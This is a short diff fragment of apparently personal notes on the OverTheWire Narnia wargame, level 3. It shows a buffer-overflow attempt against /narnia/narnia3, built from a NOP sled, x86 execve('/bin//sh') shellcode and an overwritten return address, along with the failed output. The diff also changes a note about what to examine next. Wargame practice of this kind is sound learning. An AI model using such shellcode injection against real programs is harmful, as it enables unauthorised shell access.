@@ -101,7 +101,7 @@ no luck:
 narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
 error opening 1Ph//shh/binPS̀`
 
-my guess is that the injected EIP is not being executed as a result of exit(-1) vs exit(1). we'll be tracing the source of both exits
-to see what's happening deeper under the hood.
+3) We'll next be examining the open functions. ofd and ifd.
+
 
 
